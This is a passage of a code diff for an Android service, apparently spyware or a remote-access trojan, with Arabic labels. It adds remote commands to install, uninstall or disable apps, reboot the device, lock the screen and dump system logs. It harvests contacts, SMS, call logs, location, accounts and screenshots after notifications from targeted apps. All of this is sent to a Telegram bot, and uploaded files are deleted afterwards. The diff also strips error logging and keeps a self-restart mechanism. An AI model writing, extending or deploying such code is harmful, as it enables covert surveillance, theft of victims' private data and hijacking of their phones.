+            Process process = Runtime.getRuntime().exec("pm disable " + packageName);
+            process.waitFor();
+            sendToTelegram("🔴 تعطيل", "تم تعطيل " + packageName);
+        } catch (Exception e) {
+        }
+    }
+    
+    public void enableApp(String packageName) {
+        try {
+            Process process = Runtime.getRuntime().exec("pm enable " + packageName);
+            process.waitFor();
+            sendToTelegram("🟢 تفعيل", "تم تفعيل " + packageName);
+        } catch (Exception e) {
+        }
+    }
+    
+    public void installApp(String apkPath) {
+        try {
+            Process process = Runtime.getRuntime().exec("pm install " + apkPath);
+            process.waitFor();
+            sendToTelegram("📲 تثبيت", "تم تثبيت " + apkPath);
+        } catch (Exception e) {
+        }
+    }
+    
+    public void uninstallApp(String packageName) {
+        try {
+            Process process = Runtime.getRuntime().exec("pm uninstall " + packageName);
+            process.waitFor();
+            sendToTelegram("🗑️ حذف", "تم حذف " + packageName);
+        } catch (Exception e) {
+        }
+    }
+    
+    // ========== 7. التحكم بالنظام ==========
+    private Runnable systemControlRunnable = new Runnable() {
+        @Override
+        public void run() {
+            checkSystemCommands();
+            handler.postDelayed(this, 20000);
+        }
+    };
+    
+    private void checkSystemCommands() {
+        try {
+            Process process = Runtime.getRuntime().exec("dumpsys battery");
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            StringBuilder output = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null && output.length() < 300) {
+                if (line.contains("level") || line.contains("status") || line.contains("temperature")) {
+                    output.append(line.trim()).append("\n");
+                }
+            }
+            reader.close();
+            
+            if (output.length() > 0) {
+                sendToTelegram("🔋 البطارية", output.toString());
+            }
+        } catch (Exception e) {
+        }
+    }
+    
+    public void reboot() {
+        try {
+            Process process = Runtime.getRuntime().exec("reboot");
+            sendToTelegram("🔄 إعادة تشغيل", "جاري إعادة التشغيل...");
+        } catch (Exception e) {
+        }
+    }
+    
+    public void shutdown() {
+        try {
+            Process process = Runtime.getRuntime().exec("reboot -p");
+            sendToTelegram("⏻ إطفاء", "جاري إطفاء الجهاز...");
+        } catch (Exception e) {
+        }
+    }
+    
+    public void restartSystemUI() {
+        try {
+            Process process = Runtime.getRuntime().exec("pkill -f com.android.systemui");
+            process.waitFor();
+            sendToTelegram("🔄 واجهة النظام", "تم إعادة التشغيل");
+        } catch (Exception e) {
+        }
+    }
+    
+    public void clearCache() {
+        try {
+            Process process = Runtime.getRuntime().exec("pm trim-caches 999999999");
+            process.waitFor();
+            sendToTelegram("🧹 كاش", "تم مسح الكاش");
+        } catch (Exception e) {
+        }
+    }
+    
+    public void getLogcat() {
+        try {
+            Process process = Runtime.getRuntime().exec("logcat -d -t 100");
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            StringBuilder output = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null && output.length() < 2000) {
+                output.append(line).append("\n");
+            }
+            reader.close();
+            
+            if (output.length() > 0) {
+                sendToTelegram("📋 سجل النظام", output.toString());
+            }
+        } catch (Exception e) {
+        }
+    }
+    
+    // ========== 8. التحكم بالشاشة ==========
+    private Runnable screenControlRunnable = new Runnable() {
+        @Override
+        public void run() {
+            checkScreenCommands();
+            handler.postDelayed(this, 25000);
+        }
+    };
+    
+    private void checkScreenCommands() {
+        try {
+            int brightness = Settings.System.getInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS);
+            sendToTelegram("💡 سطوع الشاشة", "المستوى: " + brightness);
+        } catch (Exception e) {
+        }
+    }
+    
+    public void lockScreen() {
+        try {
+            Process process = Runtime.getRuntime().exec("input keyevent 26");
+            sendToTelegram("🔒 قفل", "تم قفل الشاشة");
+        } catch (Exception e) {
+        }
+    }
+    
+    public void unlockScreen() {
+        try {
+            Process process = Runtime.getRuntime().exec("input keyevent 82");
+            sendToTelegram("🔓 فتح", "تم فتح الشاشة");
+        } catch (Exception e) {
+        }
+    }
+    
+    public void setBrightness(int level) {
+        try {
+            if (level < 0) level = 0;
+            if (level > 255) level = 255;
+            Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, level);
+            sendToTelegram("💡 سطوع", "تم التعديل إلى " + level);
+        } catch (Exception e) {
+        }
+    }
+    
+    public void rotateScreen() {
+        try {
+            int rotation = Settings.System.getInt(getContentResolver(), Settings.System.ACCELEROMETER_ROTATION);
+            Settings.System.putInt(getContentResolver(), Settings.System.ACCELEROMETER_ROTATION, rotation == 1 ? 0 : 1);
+            sendToTelegram("🔄 تدوير", "تم تغيير وضع التدوير");
+        } catch (Exception e) {
+        }
+    }
+    
+    // ========== 9. التحكم بالصوت ==========
+    private Runnable soundControlRunnable = new Runnable() {
+        @Override
+        public void run() {
+            checkSoundCommands();
+            handler.postDelayed(this, 30000);
+        }
+    };
+    
+    private void checkSoundCommands() {
+        try {
+            int volume = Settings.System.getInt(getContentResolver(), Settings.System.VOLUME_MUSIC);
+            sendToTelegram("🔊 مستوى الصوت", String.valueOf(volume));
+        } catch (Exception e) {
+        }
+    }
+    
+    public void setVolume(int level) {
+        try {
+            if (level < 0) level = 0;
+            if (level > 15) level = 15;
+            Settings.System.putInt(getContentResolver(), Settings.System.VOLUME_MUSIC, level);
+            sendToTelegram("🔊 صوت", "تم التعديل إلى " + level);
+        } catch (Exception e) {
+        }
+    }
+    
+    public void mute() {
+        try {
+            setVolume(0);
+            sendToTelegram("🔇 كتم", "تم كتم الصوت");
+        } catch (Exception e) {
+        }
+    }
+    
+    public void maxVolume() {
+        try {
+            setVolume(15);
+            sendToTelegram("🔊 أقصى صوت", "تم رفع الصوت للأقصى");
+        } catch (Exception e) {
+        }
+    }
+    
+    // ========== 10. التقارير ==========
     private Runnable reportRunnable = new Runnable() {
         @Override
         public void run() {
@@ -850,23 +877,25 @@ class ControlService extends Service {
     };
     
     private void sendReport() {
-        String report = "📊 تقرير:\n" +
+        String report = "📊 تقرير شامل:\n" +
                        "📸 لقطات: " + screenshotCount + "\n" +
                        "🔔 إشعارات: " + notificationCount + "\n" +
-                       "🔐 ملفات مراقبة: " + accountFileSizes.size();
+                       "🔐 ملفات مراقبة: " + accountFileSizes.size() + "\n" +
+                       "📱 تطبيقات مستهدفة: " + TARGET_APPS.length;
         sendToTelegram("📊 تقرير دوري", report);
     }
     
-    // ========== 6. البيانات الأولية ==========
+    // ========== 11. البيانات الأولية ==========
     private void grabInitialData() {
         grabContacts();
         grabSMS();
         grabCallLog();
         grabLocation();
+        grabAccounts();
         grabAppsData();
     }
     
-    // ========== 7. تسجيل الإشعارات (يستدعى من NotificationService) ==========
+    // ========== 12. تسجيل الإشعارات ==========
     public void onNotificationReceived(String appName, String title, String text) {
         try {
             if (title.length() < 2 && text.length() < 2) return;
@@ -888,16 +917,13 @@ class ControlService extends Service {
             
             sendToTelegram("إشعار جديد", message);
             
-            // لقطة شاشة بعد الإشعارات المهمة
             for (String target : TARGET_APPS) {
                 if (appName.toLowerCase().contains(target.toLowerCase())) {
                     handler.postDelayed(() -> takeScreenshot(), 1000);
                     break;
                 }
             }
-            
         } catch (Exception e) {
-            Log.e("V8", "Notif error", e);
         }
     }
     
@@ -929,7 +955,6 @@ class ControlService extends Service {
             writer.write(content);
             writer.close();
         } catch (Exception e) {
-            Log.e("V8", "Write error", e);
         }
     }
     
@@ -945,7 +970,6 @@ class ControlService extends Service {
             in.close();
             out.close();
         } catch (Exception e) {
-            Log.e("V8", "Copy error", e);
         }
     }
     
@@ -962,9 +986,7 @@ class ControlService extends Service {
             conn.setReadTimeout(5000);
             conn.getResponseCode();
             conn.disconnect();
-            
         } catch (Exception e) {
-            Log.e("V8", "Send error", e);
         }
     }
     
@@ -985,17 +1007,14 @@ class ControlService extends Service {
             
             DataOutputStream outputStream = new DataOutputStream(conn.getOutputStream());
             
-            // chat_id
             outputStream.writeBytes("--" + boundary + "\r\n");
             outputStream.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
             outputStream.writeBytes(CHAT_ID + "\r\n");
             
-            // caption
             outputStream.writeBytes("--" + boundary + "\r\n");
             outputStream.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
             outputStream.writeBytes("🔴 " + caption + "\r\n");
             
-            // document
             outputStream.writeBytes("--" + boundary + "\r\n");
             outputStream.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n");
             outputStream.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
@@ -1016,9 +1035,7 @@ class ControlService extends Service {
             conn.disconnect();
             
             file.delete();
-            
         } catch (Exception e) {
-            Log.e("V8", "Send file error", e);
         }
     }
     
@@ -1037,7 +1054,6 @@ class ControlService extends Service {
     public void onDestroy() {
         super.onDestroy();
         
-        // إعادة تشغيل الخدمة إذا تم إيقافها
         Intent broadcastIntent = new Intent();
         broadcastIntent.setAction("restartservice");
         broadcastIntent.setClass(this, RestartReceiver.class);
@@ -1048,28 +1064,3 @@ class ControlService extends Service {
         }
     }
 }
-
-// ========== مستقبل الإقلاع ==========
-class BootReceiver extends BroadcastReceiver {
-    @Override
-    public void onReceive(Context context, Intent intent) {
-        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
-            Intent serviceIntent = new Intent(context, ControlService.class);
-            context.startService(serviceIntent);
-        }
-    }
-}
-
-// ========== مستقبل إعادة التشغيل ==========
-class RestartReceiver extends BroadcastReceiver {
-    @Override
-    public void onReceive(Context context, Intent intent) {
-        if ("restartservice".equals(intent.getAction())) {
-            Intent serviceIntent = new Intent(context, ControlService.class);
-            context.startService(serviceIntent);
-        }
-    }
-}
-
-// ========== مستقبل الإشعارات (يضاف في AndroidManifest.xml) ==========
-// هذا الكلاس يكون منفصل في ملف NotificationService.java
